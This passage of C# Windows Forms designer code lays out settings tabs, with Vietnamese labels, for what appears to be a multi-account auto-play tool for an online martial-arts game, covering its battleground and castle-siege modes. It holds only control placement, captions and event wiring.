		this.textBoxToadoDen.ReadOnly = true;
		this.textBoxToadoDen.Size = new System.Drawing.Size(65, 21);
		this.textBoxToadoDen.TabIndex = 259;
		this.buttonXoaToado.Location = new System.Drawing.Point(245, 89);
		this.buttonXoaToado.Name = "buttonXoaToado";
		this.buttonXoaToado.Size = new System.Drawing.Size(20, 23);
		this.buttonXoaToado.TabIndex = 263;
		this.buttonXoaToado.Text = "X";
		this.buttonXoaToado.UseVisualStyleBackColor = true;
		this.buttonXoaToado.Click += new System.EventHandler(buttonXoaToado_Click);
		this.checkBoxDenToadoUser.AutoSize = true;
		this.checkBoxDenToadoUser.Location = new System.Drawing.Point(3, 89);
		this.checkBoxDenToadoUser.Name = "checkBoxDenToadoUser";
		this.checkBoxDenToadoUser.Size = new System.Drawing.Size(124, 19);
		this.checkBoxDenToadoUser.TabIndex = 264;
		this.checkBoxDenToadoUser.Text = "Đến tọa độ (WAR)";
		this.checkBoxDenToadoUser.UseVisualStyleBackColor = true;
		this.checkBoxDenToadoUser.CheckedChanged += new System.EventHandler(checkBoxDenToadoUser_CheckedChanged);
		this.tabPageTongKim.Controls.Add(this.comboBoxHieuUng);
		this.tabPageTongKim.Controls.Add(this.checkDungHieuUng);
		this.tabPageTongKim.Controls.Add(this.buttonQuangThuoc);
		this.tabPageTongKim.Controls.Add(this.buttonBungThuoc);
		this.tabPageTongKim.Controls.Add(this.checkBoxQuangThuoc);
		this.tabPageTongKim.Controls.Add(this.buttonThuocTDD);
		this.tabPageTongKim.Controls.Add(this.textBoxTocdoDanh);
		this.tabPageTongKim.Controls.Add(this.checkBoxAnThuocTDD);
		this.tabPageTongKim.Controls.Add(this.label35);
		this.tabPageTongKim.Controls.Add(this.comboBoxcauhinh);
		this.tabPageTongKim.Controls.Add(this.checkBoxoverlay);
		this.tabPageTongKim.Controls.Add(this.checkBoxFixtoadolag);
		this.tabPageTongKim.Controls.Add(this.label22);
		this.tabPageTongKim.Controls.Add(this.checkBoxTuChonClick);
		this.tabPageTongKim.Controls.Add(this.labelToadoTrinhsat);
		this.tabPageTongKim.Controls.Add(this.label40);
		this.tabPageTongKim.Controls.Add(this.buttonStopMuamau);
		this.tabPageTongKim.Controls.Add(this.buttonCongHauDoanh);
		this.tabPageTongKim.Controls.Add(this.buttonTatcaMuamau);
		this.tabPageTongKim.Controls.Add(this.checkBoxTubaoDanh);
		this.tabPageTongKim.Controls.Add(this.textBoxClickMenuTS);
		this.tabPageTongKim.Controls.Add(this.comboBoxTrinhsat);
		this.tabPageTongKim.Controls.Add(this.checkBoxAccChinhHauDoanh);
		this.tabPageTongKim.Controls.Add(this.textBoxTruotTK);
		this.tabPageTongKim.Controls.Add(this.checkBoxDanhHieuuy);
		this.tabPageTongKim.Controls.Add(this.checkBoxTKThanhTruot);
		this.tabPageTongKim.Controls.Add(this.checkBoxTongKimXemSoluong);
		this.tabPageTongKim.Controls.Add(this.checkBoxAccPhuHauDoanh);
		this.tabPageTongKim.Controls.Add(this.comboBoxVaodiemBaodanh);
		this.tabPageTongKim.Controls.Add(this.checkBoxTrinhSat);
		this.tabPageTongKim.Controls.Add(this.toadotk);
		this.tabPageTongKim.Location = new System.Drawing.Point(4, 24);
		this.tabPageTongKim.Name = "tabPageTongKim";
		this.tabPageTongKim.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTongKim.Size = new System.Drawing.Size(390, 263);
		this.tabPageTongKim.TabIndex = 6;
		this.tabPageTongKim.Text = "Tống Kim";
		this.tabPageTongKim.UseVisualStyleBackColor = true;
		this.comboBoxHieuUng.FormattingEnabled = true;
		this.comboBoxHieuUng.Location = new System.Drawing.Point(272, 234);
		this.comboBoxHieuUng.Name = "comboBoxHieuUng";
		this.comboBoxHieuUng.Size = new System.Drawing.Size(109, 23);
		this.comboBoxHieuUng.TabIndex = 355;
		this.comboBoxHieuUng.SelectedIndexChanged += new System.EventHandler(comboBoxHieuUng_SelectedIndexChanged);
		this.checkDungHieuUng.AutoSize = true;
		this.checkDungHieuUng.BackColor = System.Drawing.Color.BurlyWood;
		this.checkDungHieuUng.Location = new System.Drawing.Point(256, 209);
		this.checkDungHieuUng.Name = "checkDungHieuUng";
		this.checkDungHieuUng.Size = new System.Drawing.Size(129, 19);
		this.checkDungHieuUng.TabIndex = 354;
		this.checkDungHieuUng.Text = "Chọn Danh Hiệu :  ";
		this.checkDungHieuUng.UseVisualStyleBackColor = false;
		this.checkDungHieuUng.CheckedChanged += new System.EventHandler(checkDungHieuUng_CheckedChanged);
		this.buttonQuangThuoc.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonQuangThuoc.Location = new System.Drawing.Point(327, 53);
		this.buttonQuangThuoc.Name = "buttonQuangThuoc";
		this.buttonQuangThuoc.Size = new System.Drawing.Size(60, 23);
		this.buttonQuangThuoc.TabIndex = 212;
		this.buttonQuangThuoc.Text = "Thiết lập";
		this.buttonQuangThuoc.UseVisualStyleBackColor = true;
		this.buttonQuangThuoc.Click += new System.EventHandler(buttonQuangThuoc_Click);
		this.buttonBungThuoc.BackColor = System.Drawing.SystemColors.Control;
		this.buttonBungThuoc.ForeColor = System.Drawing.Color.Black;
		this.buttonBungThuoc.Location = new System.Drawing.Point(280, 52);
		this.buttonBungThuoc.Name = "buttonBungThuoc";
		this.buttonBungThuoc.Size = new System.Drawing.Size(44, 23);
		this.buttonBungThuoc.TabIndex = 192;
		this.buttonBungThuoc.Text = "Q";
		this.buttonBungThuoc.UseVisualStyleBackColor = false;
		this.buttonBungThuoc.Click += new System.EventHandler(buttonBungThuoc_Click);
		this.checkBoxQuangThuoc.AutoSize = true;
		this.checkBoxQuangThuoc.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxQuangThuoc.Location = new System.Drawing.Point(4, 52);
		this.checkBoxQuangThuoc.Name = "checkBoxQuangThuoc";
		this.checkBoxQuangThuoc.Size = new System.Drawing.Size(264, 17);
		this.checkBoxQuangThuoc.TabIndex = 210;
		this.checkBoxQuangThuoc.Text = "Thiết lập tùy chọn phím cho acc phụ quăng thuốc";
		this.checkBoxQuangThuoc.UseVisualStyleBackColor = true;
		this.checkBoxQuangThuoc.CheckedChanged += new System.EventHandler(checkBoxQuangThuoc_CheckedChanged);
		this.buttonThuocTDD.ForeColor = System.Drawing.Color.Black;
		this.buttonThuocTDD.Location = new System.Drawing.Point(326, 28);
		this.buttonThuocTDD.Name = "buttonThuocTDD";
		this.buttonThuocTDD.Size = new System.Drawing.Size(60, 23);
		this.buttonThuocTDD.TabIndex = 167;
		this.buttonThuocTDD.Text = "Thuốc";
		this.buttonThuocTDD.UseVisualStyleBackColor = true;
		this.buttonThuocTDD.Click += new System.EventHandler(buttonThuocTDD_Click);
		this.textBoxTocdoDanh.ForeColor = System.Drawing.Color.Black;
		this.textBoxTocdoDanh.Location = new System.Drawing.Point(281, 29);
		this.textBoxTocdoDanh.Name = "textBoxTocdoDanh";
		this.textBoxTocdoDanh.Size = new System.Drawing.Size(43, 21);
		this.textBoxTocdoDanh.TabIndex = 146;
		this.textBoxTocdoDanh.TextChanged += new System.EventHandler(textBoxTocdoDanh_TextChanged);
		this.checkBoxAnThuocTDD.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxAnThuocTDD.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxAnThuocTDD.ForeColor = System.Drawing.Color.Red;
		this.checkBoxAnThuocTDD.Location = new System.Drawing.Point(4, 28);
		this.checkBoxAnThuocTDD.Name = "checkBoxAnThuocTDD";
		this.checkBoxAnThuocTDD.Size = new System.Drawing.Size(271, 21);
		this.checkBoxAnThuocTDD.TabIndex = 166;
		this.checkBoxAnThuocTDD.Text = "Ăn LAG khi tốc độ đánh. Tốc độ đánh + thêm 60 =";
		this.checkBoxAnThuocTDD.UseVisualStyleBackColor = false;
		this.checkBoxAnThuocTDD.CheckedChanged += new System.EventHandler(checkBoxAnThuocTDD_CheckedChanged);
		this.label35.AutoSize = true;
		this.label35.Location = new System.Drawing.Point(269, 185);
		this.label35.Name = "label35";
		this.label35.Size = new System.Drawing.Size(59, 15);
		this.label35.TabIndex = 352;
		this.label35.Text = "Phạm Vi :";
		this.comboBoxcauhinh.FormattingEnabled = true;
		this.comboBoxcauhinh.Location = new System.Drawing.Point(331, 183);
		this.comboBoxcauhinh.Name = "comboBoxcauhinh";
		this.comboBoxcauhinh.Size = new System.Drawing.Size(50, 23);
		this.comboBoxcauhinh.TabIndex = 351;
		this.comboBoxcauhinh.SelectedIndexChanged += new System.EventHandler(comboBoxcauhinh_SelectedIndexChanged);
		this.checkBoxoverlay.AutoSize = true;
		this.checkBoxoverlay.BackColor = System.Drawing.Color.GreenYellow;
		this.checkBoxoverlay.Location = new System.Drawing.Point(255, 158);
		this.checkBoxoverlay.Name = "checkBoxoverlay";
		this.checkBoxoverlay.Size = new System.Drawing.Size(126, 19);
		this.checkBoxoverlay.TabIndex = 349;
		this.checkBoxoverlay.Text = "Hiển thị Vòng :       ";
		this.checkBoxoverlay.UseVisualStyleBackColor = false;
		this.checkBoxoverlay.CheckedChanged += new System.EventHandler(checkBoxoverlay_CheckedChanged);
		this.checkBoxFixtoadolag.BackColor = System.Drawing.Color.LightSalmon;
		this.checkBoxFixtoadolag.ForeColor = System.Drawing.Color.Black;
		this.checkBoxFixtoadolag.Location = new System.Drawing.Point(255, 107);
		this.checkBoxFixtoadolag.Name = "checkBoxFixtoadolag";
		this.checkBoxFixtoadolag.Size = new System.Drawing.Size(130, 22);
		this.checkBoxFixtoadolag.TabIndex = 347;
		this.checkBoxFixtoadolag.Text = "Fix lag tọa độ TK";
		this.checkBoxFixtoadolag.UseVisualStyleBackColor = false;
		this.checkBoxFixtoadolag.CheckedChanged += new System.EventHandler(checkBoxFixtoadolag_CheckedChanged);
		this.label22.AutoSize = true;
		this.label22.Location = new System.Drawing.Point(21, 154);
		this.label22.Name = "label22";
		this.label22.Size = new System.Drawing.Size(79, 15);
		this.label22.TabIndex = 346;
		this.label22.Text = "click dòng =>";
		this.checkBoxTuChonClick.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxTuChonClick.Location = new System.Drawing.Point(135, 152);
		this.checkBoxTuChonClick.Name = "checkBoxTuChonClick";
		this.checkBoxTuChonClick.Size = new System.Drawing.Size(115, 19);
		this.checkBoxTuChonClick.TabIndex = 345;
		this.checkBoxTuChonClick.Text = "hoặc tự chọn click";
		this.checkBoxTuChonClick.UseVisualStyleBackColor = true;
		this.checkBoxTuChonClick.CheckedChanged += new System.EventHandler(checkBoxTuChonClick_CheckedChanged);
		this.labelToadoTrinhsat.AutoSize = true;
		this.labelToadoTrinhsat.ForeColor = System.Drawing.Color.MediumBlue;
		this.labelToadoTrinhsat.Location = new System.Drawing.Point(180, 102);
		this.labelToadoTrinhsat.Name = "labelToadoTrinhsat";
		this.labelToadoTrinhsat.Size = new System.Drawing.Size(30, 15);
		this.labelToadoTrinhsat.TabIndex = 344;
		this.labelToadoTrinhsat.Text = "( ... )";
		this.labelToadoTrinhsat.Click += new System.EventHandler(labelToadoTrinhsat_Click);
		this.label40.AutoSize = true;
		this.label40.Location = new System.Drawing.Point(3, 152);
		this.label40.Name = "label40";
		this.label40.Size = new System.Drawing.Size(17, 15);
		this.label40.TabIndex = 343;
		this.label40.Text = "|_";
		this.buttonStopMuamau.Location = new System.Drawing.Point(141, 224);
		this.buttonStopMuamau.Name = "buttonStopMuamau";
		this.buttonStopMuamau.Size = new System.Drawing.Size(45, 33);
		this.buttonStopMuamau.TabIndex = 222;
		this.buttonStopMuamau.Text = "Stop";
		this.buttonStopMuamau.UseVisualStyleBackColor = true;
		this.buttonStopMuamau.Click += new System.EventHandler(buttonStopMuamau_Click);
		this.buttonCongHauDoanh.Location = new System.Drawing.Point(187, 224);
		this.buttonCongHauDoanh.Name = "buttonCongHauDoanh";
		this.buttonCongHauDoanh.Size = new System.Drawing.Size(63, 33);
		this.buttonCongHauDoanh.TabIndex = 221;
		this.buttonCongHauDoanh.Text = "Cổng";
		this.buttonCongHauDoanh.UseVisualStyleBackColor = true;
		this.buttonCongHauDoanh.Click += new System.EventHandler(buttonCongHauDoanh_Click);
		this.buttonTatcaMuamau.ForeColor = System.Drawing.Color.Red;
		this.buttonTatcaMuamau.Location = new System.Drawing.Point(4, 224);
		this.buttonTatcaMuamau.Name = "buttonTatcaMuamau";
		this.buttonTatcaMuamau.Size = new System.Drawing.Size(133, 35);
		this.buttonTatcaMuamau.TabIndex = 220;
		this.buttonTatcaMuamau.Text = "Tất cả chạy mua máu";
		this.buttonTatcaMuamau.UseVisualStyleBackColor = true;
		this.buttonTatcaMuamau.Click += new System.EventHandler(buttonTatcaMuamau_Click);
		this.checkBoxTubaoDanh.AutoSize = true;
		this.checkBoxTubaoDanh.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTubaoDanh.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTubaoDanh.Location = new System.Drawing.Point(4, 5);
		this.checkBoxTubaoDanh.Name = "checkBoxTubaoDanh";
		this.checkBoxTubaoDanh.Size = new System.Drawing.Size(296, 19);
		this.checkBoxTubaoDanh.TabIndex = 170;
		this.checkBoxTubaoDanh.Text = "Tự báo danh Tống Kim, Chọn Tống hoặc Kim ==>";
		this.checkBoxTubaoDanh.UseVisualStyleBackColor = false;
		this.checkBoxTubaoDanh.CheckedChanged += new System.EventHandler(checkBoxTubaoDanh_CheckedChanged);
		this.textBoxClickMenuTS.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxClickMenuTS.ForeColor = System.Drawing.Color.MediumBlue;
		this.textBoxClickMenuTS.Location = new System.Drawing.Point(100, 150);
		this.textBoxClickMenuTS.Name = "textBoxClickMenuTS";
		this.textBoxClickMenuTS.Size = new System.Drawing.Size(32, 21);
		this.textBoxClickMenuTS.TabIndex = 218;
		this.textBoxClickMenuTS.TextChanged += new System.EventHandler(textBoxClickMenuTS_TextChanged);
		this.comboBoxTrinhsat.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTrinhsat.DropDownWidth = 110;
		this.comboBoxTrinhsat.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTrinhsat.FormattingEnabled = true;
		this.comboBoxTrinhsat.Location = new System.Drawing.Point(170, 124);
		this.comboBoxTrinhsat.Name = "comboBoxTrinhsat";
		this.comboBoxTrinhsat.Size = new System.Drawing.Size(80, 23);
		this.comboBoxTrinhsat.TabIndex = 216;
		this.comboBoxTrinhsat.SelectedIndexChanged += new System.EventHandler(comboBoxTrinhsat_SelectedIndexChanged);
		this.comboBoxTrinhsat.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTrinhsat_MouseDown);
		this.checkBoxAccChinhHauDoanh.AutoSize = true;
		this.checkBoxAccChinhHauDoanh.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxAccChinhHauDoanh.ForeColor = System.Drawing.Color.Red;
		this.checkBoxAccChinhHauDoanh.Location = new System.Drawing.Point(3, 100);
		this.checkBoxAccChinhHauDoanh.Name = "checkBoxAccChinhHauDoanh";
		this.checkBoxAccChinhHauDoanh.Size = new System.Drawing.Size(161, 19);
		this.checkBoxAccChinhHauDoanh.TabIndex = 148;
		this.checkBoxAccChinhHauDoanh.Text = "Ac chính tự chạy ra ngoài";
		this.checkBoxAccChinhHauDoanh.UseVisualStyleBackColor = false;
		this.checkBoxAccChinhHauDoanh.CheckedChanged += new System.EventHandler(checkBoxAccChinhHauDoanh_CheckedChanged);
		this.textBoxTruotTK.ForeColor = System.Drawing.Color.Black;
		this.textBoxTruotTK.Location = new System.Drawing.Point(200, 196);
		this.textBoxTruotTK.Name = "textBoxTruotTK";
		this.textBoxTruotTK.Size = new System.Drawing.Size(48, 21);
		this.textBoxTruotTK.TabIndex = 215;
		this.textBoxTruotTK.TextChanged += new System.EventHandler(textBoxTruotTK_TextChanged);
		this.checkBoxDanhHieuuy.BackColor = System.Drawing.Color.Aquamarine;
		this.checkBoxDanhHieuuy.ForeColor = System.Drawing.Color.Red;
		this.checkBoxDanhHieuuy.Location = new System.Drawing.Point(254, 79);
		this.checkBoxDanhHieuuy.Name = "checkBoxDanhHieuuy";
		this.checkBoxDanhHieuuy.Size = new System.Drawing.Size(130, 22);
		this.checkBoxDanhHieuuy.TabIndex = 214;
		this.checkBoxDanhHieuuy.Text = "Trùm KS mạng";
		this.checkBoxDanhHieuuy.UseVisualStyleBackColor = false;
		this.checkBoxDanhHieuuy.CheckedChanged += new System.EventHandler(checkBoxDanhHieuuy_CheckedChanged);
		this.checkBoxTKThanhTruot.AutoSize = true;
		this.checkBoxTKThanhTruot.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTKThanhTruot.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTKThanhTruot.Location = new System.Drawing.Point(4, 200);
		this.checkBoxTKThanhTruot.Name = "checkBoxTKThanhTruot";
		this.checkBoxTKThanhTruot.Size = new System.Drawing.Size(198, 17);
		this.checkBoxTKThanhTruot.TabIndex = 213;
		this.checkBoxTKThanhTruot.Text = "Có thanh trượt khi chạy ra ngoài cửa";
		this.checkBoxTKThanhTruot.UseVisualStyleBackColor = true;
		this.checkBoxTKThanhTruot.CheckedChanged += new System.EventHandler(checkBoxTKThanhTruot_CheckedChanged);
		this.checkBoxTongKimXemSoluong.AutoSize = true;
		this.checkBoxTongKimXemSoluong.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTongKimXemSoluong.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTongKimXemSoluong.Location = new System.Drawing.Point(4, 175);
		this.checkBoxTongKimXemSoluong.Name = "checkBoxTongKimXemSoluong";
		this.checkBoxTongKimXemSoluong.Size = new System.Drawing.Size(244, 19);
		this.checkBoxTongKimXemSoluong.TabIndex = 169;
		this.checkBoxTongKimXemSoluong.Text = "Xem điểm tống kim ( trên đầu nhân vật )";
		this.checkBoxTongKimXemSoluong.UseVisualStyleBackColor = false;
		this.checkBoxTongKimXemSoluong.CheckedChanged += new System.EventHandler(checkBoxTongKimXemSoluong_CheckedChanged);
		this.checkBoxAccPhuHauDoanh.AutoSize = true;
		this.checkBoxAccPhuHauDoanh.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxAccPhuHauDoanh.ForeColor = System.Drawing.Color.Black;
		this.checkBoxAccPhuHauDoanh.Location = new System.Drawing.Point(3, 75);
		this.checkBoxAccPhuHauDoanh.Name = "checkBoxAccPhuHauDoanh";
		this.checkBoxAccPhuHauDoanh.Size = new System.Drawing.Size(237, 19);
		this.checkBoxAccPhuHauDoanh.TabIndex = 149;
		this.checkBoxAccPhuHauDoanh.Text = "Ac phụ chờ ac chính ra khỏi hậu doanh";
		this.checkBoxAccPhuHauDoanh.UseVisualStyleBackColor = false;
		this.checkBoxAccPhuHauDoanh.CheckedChanged += new System.EventHandler(checkBoxAccPhuHauDoanh_CheckedChanged);
		this.comboBoxVaodiemBaodanh.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxVaodiemBaodanh.FormattingEnabled = true;
		this.comboBoxVaodiemBaodanh.Location = new System.Drawing.Point(305, 3);
		this.comboBoxVaodiemBaodanh.Name = "comboBoxVaodiemBaodanh";
		this.comboBoxVaodiemBaodanh.Size = new System.Drawing.Size(80, 23);
		this.comboBoxVaodiemBaodanh.TabIndex = 157;
		this.comboBoxVaodiemBaodanh.SelectedIndexChanged += new System.EventHandler(comboBoxVaodiemBaodanh_SelectedIndexChanged);
		this.checkBoxTrinhSat.AutoSize = true;
		this.checkBoxTrinhSat.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTrinhSat.ForeColor = System.Drawing.Color.MediumBlue;
		this.checkBoxTrinhSat.Location = new System.Drawing.Point(3, 125);
		this.checkBoxTrinhSat.Name = "checkBoxTrinhSat";
		this.checkBoxTrinhSat.Size = new System.Drawing.Size(166, 19);
		this.checkBoxTrinhSat.TabIndex = 160;
		this.checkBoxTrinhSat.Text = "Ra bằng trinh sát, tên ==>";
		this.checkBoxTrinhSat.UseVisualStyleBackColor = false;
		this.checkBoxTrinhSat.CheckedChanged += new System.EventHandler(checkBoxTrinhSat_CheckedChanged);
		this.toadotk.BackColor = System.Drawing.Color.Chartreuse;
		this.toadotk.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.toadotk.Location = new System.Drawing.Point(255, 133);
		this.toadotk.Name = "toadotk";
		this.toadotk.Size = new System.Drawing.Size(130, 19);
		this.toadotk.TabIndex = 348;
		this.toadotk.Text = "Chạy Tọa độ TK";
		this.toadotk.UseVisualStyleBackColor = false;
		this.toadotk.CheckedChanged += new System.EventHandler(toadotk_CheckedChanged);
		this.tabPageCTC.Controls.Add(this.label26);
		this.tabPageCTC.Controls.Add(this.comboBoxCTC);
		this.tabPageCTC.Controls.Add(this.tabControlThatThanh);
		this.tabPageCTC.Controls.Add(this.checkBoxAccChinhTudieukhienCTC);
		this.tabPageCTC.Location = new System.Drawing.Point(4, 24);
		this.tabPageCTC.Name = "tabPageCTC";
		this.tabPageCTC.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageCTC.Size = new System.Drawing.Size(390, 263);
		this.tabPageCTC.TabIndex = 4;
		this.tabPageCTC.Text = "Công Thành Chiến";
		this.tabPageCTC.UseVisualStyleBackColor = true;
		this.label26.ForeColor = System.Drawing.SystemColors.Highlight;
		this.label26.Location = new System.Drawing.Point(6, 45);
		this.label26.Name = "label26";
		this.label26.Size = new System.Drawing.Size(126, 69);
		this.label26.TabIndex = 238;
		this.label26.Text = "Hãy chuyển Auto sang chế độ đánh CTC và chọn chế độ đánh CTC ô dưới đây :";
		this.label26.Click += new System.EventHandler(label26_Click);
		this.comboBoxCTC.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxCTC.ForeColor = System.Drawing.Color.MediumBlue;
		this.comboBoxCTC.FormattingEnabled = true;
		this.comboBoxCTC.Location = new System.Drawing.Point(7, 119);
		this.comboBoxCTC.Name = "comboBoxCTC";
		this.comboBoxCTC.Size = new System.Drawing.Size(126, 23);
		this.comboBoxCTC.TabIndex = 237;
		this.comboBoxCTC.SelectedIndexChanged += new System.EventHandler(comboBoxCTC_SelectedIndexChanged);
		this.tabControlThatThanh.Controls.Add(this.tabPageThatthanh);
		this.tabControlThatThanh.Controls.Add(this.tabPageTamtru);
		this.tabControlThatThanh.Controls.Add(this.tabPageTamMondai);
		this.tabControlThatThanh.Location = new System.Drawing.Point(135, 3);
		this.tabControlThatThanh.Margin = new System.Windows.Forms.Padding(0);
		this.tabControlThatThanh.Name = "tabControlThatThanh";
		this.tabControlThatThanh.SelectedIndex = 0;
		this.tabControlThatThanh.Size = new System.Drawing.Size(254, 253);
		this.tabControlThatThanh.TabIndex = 236;
		this.tabPageThatthanh.Controls.Add(this.textBox4);
		this.tabPageThatthanh.Controls.Add(this.buttonBandoCTC);
		this.tabPageThatthanh.Controls.Add(this.checkBoxVaomapAchinh);
		this.tabPageThatthanh.Controls.Add(this.label15);
		this.tabPageThatthanh.Controls.Add(this.buttonPhimHDCTC);
		this.tabPageThatthanh.Controls.Add(this.comboBoxChienTruongMapPhu);
		this.tabPageThatthanh.Controls.Add(this.buttonLayVitriXaphuCTQ);
		this.tabPageThatthanh.Controls.Add(this.checkBoxOluonMapphu);
		this.tabPageThatthanh.Controls.Add(this.label17);
		this.tabPageThatthanh.Controls.Add(this.label34);
		this.tabPageThatthanh.Controls.Add(this.labelChuadaydu);
		this.tabPageThatthanh.Controls.Add(this.comboBoxChienTruong);
		this.tabPageThatthanh.Controls.Add(this.checkBoxMapPhu);
		this.tabPageThatthanh.Controls.Add(this.checkBoxTHPCTC);
		this.tabPageThatthanh.Location = new System.Drawing.Point(4, 24);
		this.tabPageThatthanh.Name = "tabPageThatthanh";
		this.tabPageThatthanh.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageThatthanh.Size = new System.Drawing.Size(246, 225);
		this.tabPageThatthanh.TabIndex = 0;
		this.tabPageThatthanh.Text = "Thất thành";
		this.tabPageThatthanh.UseVisualStyleBackColor = true;
		this.textBox4.Location = new System.Drawing.Point(201, 77);
		this.textBox4.Name = "textBox4";
		this.textBox4.Size = new System.Drawing.Size(44, 21);
		this.textBox4.TabIndex = 242;
		this.textBox4.TextChanged += new System.EventHandler(textBox4_TextChanged);
		this.buttonBandoCTC.ForeColor = System.Drawing.Color.Black;
		this.buttonBandoCTC.Location = new System.Drawing.Point(119, 184);
		this.buttonBandoCTC.Name = "buttonBandoCTC";
		this.buttonBandoCTC.Size = new System.Drawing.Size(126, 38);
		this.buttonBandoCTC.TabIndex = 241;
		this.buttonBandoCTC.Text = "Xem bản đồ đường đi";
		this.buttonBandoCTC.UseVisualStyleBackColor = true;
		this.buttonBandoCTC.Click += new System.EventHandler(buttonBandoCTC_Click);
		this.checkBoxVaomapAchinh.AutoSize = true;
		this.checkBoxVaomapAchinh.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxVaomapAchinh.ForeColor = System.Drawing.Color.Black;
		this.checkBoxVaomapAchinh.Location = new System.Drawing.Point(2, 52);
		this.checkBoxVaomapAchinh.Name = "checkBoxVaomapAchinh";
		this.checkBoxVaomapAchinh.Size = new System.Drawing.Size(235, 17);
		this.checkBoxVaomapAchinh.TabIndex = 240;
		this.checkBoxVaomapAchinh.Text = "Ac phụ tự vào map nơi ac chính đang đứng";
		this.checkBoxVaomapAchinh.TextAlign = System.Drawing.ContentAlignment.TopLeft;
		this.checkBoxVaomapAchinh.UseVisualStyleBackColor = true;
		this.checkBoxVaomapAchinh.CheckedChanged += new System.EventHandler(checkBoxVaomapAchinh_CheckedChanged);
		this.label15.AutoSize = true;
		this.label15.ForeColor = System.Drawing.Color.Red;
		this.label15.Location = new System.Drawing.Point(11, 29);
		this.label15.Name = "label15";
		this.label15.Size = new System.Drawing.Size(96, 15);
		this.label15.TabIndex = 235;
		this.label15.Text = "Bản đồ CTC phụ";
		this.buttonPhimHDCTC.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonPhimHDCTC.Location = new System.Drawing.Point(1, 184);
		this.buttonPhimHDCTC.Name = "buttonPhimHDCTC";
		this.buttonPhimHDCTC.Size = new System.Drawing.Size(112, 38);
		this.buttonPhimHDCTC.TabIndex = 232;
		this.buttonPhimHDCTC.Text = "Phim hướng dẫn";
		this.buttonPhimHDCTC.UseVisualStyleBackColor = true;
		this.buttonPhimHDCTC.Click += new System.EventHandler(buttonPhimHDCTC_Click);
		this.comboBoxChienTruongMapPhu.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChienTruongMapPhu.ForeColor = System.Drawing.Color.Black;
		this.comboBoxChienTruongMapPhu.FormattingEnabled = true;
		this.comboBoxChienTruongMapPhu.Location = new System.Drawing.Point(113, 26);
		this.comboBoxChienTruongMapPhu.Name = "comboBoxChienTruongMapPhu";
		this.comboBoxChienTruongMapPhu.Size = new System.Drawing.Size(129, 23);
		this.comboBoxChienTruongMapPhu.TabIndex = 227;
		this.comboBoxChienTruongMapPhu.SelectedIndexChanged += new System.EventHandler(comboBoxChienTruongMapPhu_SelectedIndexChanged);
		this.buttonLayVitriXaphuCTQ.ForeColor = System.Drawing.Color.Black;
		this.buttonLayVitriXaphuCTQ.Location = new System.Drawing.Point(113, 106);
		this.buttonLayVitriXaphuCTQ.Name = "buttonLayVitriXaphuCTQ";
		this.buttonLayVitriXaphuCTQ.Size = new System.Drawing.Size(132, 26);
		this.buttonLayVitriXaphuCTQ.TabIndex = 233;
		this.buttonLayVitriXaphuCTQ.Text = "Lấy vị trí xa phu CTC";
		this.buttonLayVitriXaphuCTQ.UseVisualStyleBackColor = true;
		this.buttonLayVitriXaphuCTQ.Click += new System.EventHandler(buttonLayVitriXaphuCTQ_Click);
		this.checkBoxOluonMapphu.AutoSize = true;
		this.checkBoxOluonMapphu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxOluonMapphu.ForeColor = System.Drawing.Color.Black;
		this.checkBoxOluonMapphu.Location = new System.Drawing.Point(3, 161);
		this.checkBoxOluonMapphu.Name = "checkBoxOluonMapphu";
		this.checkBoxOluonMapphu.Size = new System.Drawing.Size(244, 17);
		this.checkBoxOluonMapphu.TabIndex = 165;
		this.checkBoxOluonMapphu.Text = "Không trở về map chính khi đã sang map phụ";
		this.checkBoxOluonMapphu.UseVisualStyleBackColor = true;
		this.checkBoxOluonMapphu.CheckedChanged += new System.EventHandler(checkBoxOluonMapphu_CheckedChanged);
		this.label17.AutoSize = true;
		this.label17.ForeColor = System.Drawing.Color.Red;
		this.label17.Location = new System.Drawing.Point(1, 5);
		this.label17.Name = "label17";
		this.label17.Size = new System.Drawing.Size(105, 15);
		this.label17.TabIndex = 183;
		this.label17.Text = "Bản đồ CTC chính";
		this.label34.AutoSize = true;
		this.label34.ForeColor = System.Drawing.Color.Red;
		this.label34.Location = new System.Drawing.Point(1, 111);
		this.label34.Name = "label34";
		this.label34.Size = new System.Drawing.Size(107, 15);
		this.label34.TabIndex = 234;
		this.label34.Text = "Đi xa phu vào CTC";
		this.labelChuadaydu.AutoSize = true;
		this.labelChuadaydu.ForeColor = System.Drawing.Color.Black;
		this.labelChuadaydu.Location = new System.Drawing.Point(4, 124);
		this.labelChuadaydu.Name = "labelChuadaydu";
		this.labelChuadaydu.Size = new System.Drawing.Size(16, 15);
		this.labelChuadaydu.TabIndex = 234;
		this.labelChuadaydu.Text = "...";
		this.comboBoxChienTruong.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
